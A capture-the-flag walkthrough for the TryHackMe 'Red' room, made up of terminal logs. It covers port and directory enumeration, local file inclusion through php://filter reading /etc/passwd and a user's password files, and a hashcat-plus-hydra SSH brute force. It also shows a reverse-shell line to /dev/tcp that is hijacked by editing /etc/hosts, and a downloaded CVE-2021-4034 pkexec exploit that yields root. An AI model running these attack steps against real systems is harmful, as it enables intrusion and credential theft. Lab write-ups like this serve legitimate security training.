<code>
  
LINK https://tryhackme.com/r/room/redisl33t

### Service Enumeration

┌──(duke㉿kali)-[~/Documents/THM_Red]
└─$ nmap -sV  -p- -Pn  red.thm     
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-29 02:31 CDT
Nmap scan report for red.thm (10.10.108.254)
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.37 seconds

### WWW Enumeration

┌──(duke㉿kali)-[~/Documents/THM_Red]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://red.thm -x php,txt,html

Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://red.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php
[+] Timeout:                 10s

2024/05/29 02:52:10 Starting gobuster in directory enumeration mode

/index.php            (Status: 302) [Size: 0] [--> /index.php?page=home.html]
/contact.html         (Status: 200) [Size: 7507]                             
/about.html           (Status: 200) [Size: 9309]                             
/home.html            (Status: 200) [Size: 15757]                            
/services.html        (Status: 200) [Size: 9131]                             
/signup.html          (Status: 200) [Size: 7283]                             
/assets               (Status: 301) [Size: 303] [--> http://red.thm/assets/] 
/portfolio.html       (Status: 200) [Size: 14352]                            
/signin.html          (Status: 200) [Size: 6655]                             
/readme.txt           (Status: 200) [Size: 675]                              
/server-status        (Status: 403) [Size: 272]  

### get local file
GET http://red.thm/index.php?page=php://filter/resource=/etc/passwd HTTP/1.1

root:x:0:0:root:/root:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash

### reply from bash history 
http://red.thm/index.php?page=php://filter/resource=/home/blue/.bash_history
echo "Red rules" cd hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt cat passlist.txt rm passlist.txt sudo apt-get remove hashcat -y 
http://red.thm/index.php?page=php://filter/resource=/home/blue/.reminder
sup3r_p@s$w0rd! 


┌──(duke㉿kali)-[~/Documents/THM_Red]
└─$ hashcat --stdout reminder -r ../../../..//usr/share/hashcat/rules/best64.rule > passlist.txt 
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_Red]
└─$ cat passlist.txt         
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
....

### Use hydra to brute force
┌──(duke㉿kali)-[~/Documents/THM_Red]
└─$ hydra -l blue -P passlist.txt ssh://10.10.141.213
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-30 06:22:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.141.213:22/
[22][ssh] host: 10.10.141.213   login: blue   password: sup3r_p@s$w0rd!9
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-30 06:22:29

## Credentials login: blue   password: sup3r_p@s$w0rd!9
get first flag

### run linpeas nothing
### run PsPy32
2024/05/31 08:55:01 CMD: UID=0     PID=42226  | grep -v root 
2024/05/31 08:55:01 CMD: UID=1001  PID=42228  | sh 
2024/05/31 08:55:01 CMD: UID=1001  PID=42229  | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 

on background is creating reverse shell to redrules.thm/9001

## Modify /etc/hosts to own IP and run listener on port 9001
echo "10.9.30.202 redrules.thm" >> /etc/hosts
get red console and second flag 

### run linpeas and found SUID 

red@red:~/.git$ find / -type f -perm -4000 2>/dev/null
/home/red/.git/pkexec

## cant compile exploit CVE-2021-4034 no gcc/cc/depencies but exist Python3  exploit

red@red:/tmp$ wget http://10.9.30.202/CVE-2021-4034.py                          
--2024-05-31 09:14:46--  http://10.9.30.202/CVE-2021-4034.py
Connecting to 10.9.30.202:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3377 (3.3K) [text/x-python]
Saving to: ‘CVE-2021-4034.py’

CVE-2021-4034.py    100%[===================>]   3.30K  --.-KB/s    in 0s      

2024-05-31 09:14:46 (242 MB/s) - ‘CVE-2021-4034.py’ saved [3377/3377]

red@red:/tmp$ python3 CVE-2021-4034.py
python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
id
uid=0(root) gid=1001(red) groups=1001(red)

</code>
